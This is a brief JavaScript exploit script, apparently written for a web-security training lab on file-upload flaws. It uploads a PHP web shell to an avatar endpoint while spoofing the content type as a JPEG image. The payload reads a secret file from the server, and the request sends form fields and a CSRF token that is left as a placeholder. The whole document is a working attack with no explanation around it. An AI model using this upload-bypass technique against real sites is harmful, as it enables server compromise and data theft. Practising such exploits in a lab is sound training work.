const typeYouWant = `image/jpeg`;
const payload = `<?php echo file_get_contents('/home/carlos/secret'); ?>`;
const name="script2.php";
const csrfToken="getThisTOken probably need to this parameter asswell";
const path = "/my-account/avatar";

const blob = new Blob([payload], { type: typeYouWant });
const file = new File([blob], name, { type: typeYouWant });

// The form data
const formData = new FormData();
formData.append("avatar", file);
formData.append("user", "wiener");
formData.append("csrf", csrfToken);

// The request options
const options = {
    method: "POST",
    body: formData
};

// Fetch request
fetch(path, options)
    .then(response => response.text())
    .then(data => console.log(data))
    .catch(error => console.error('Error:', error));
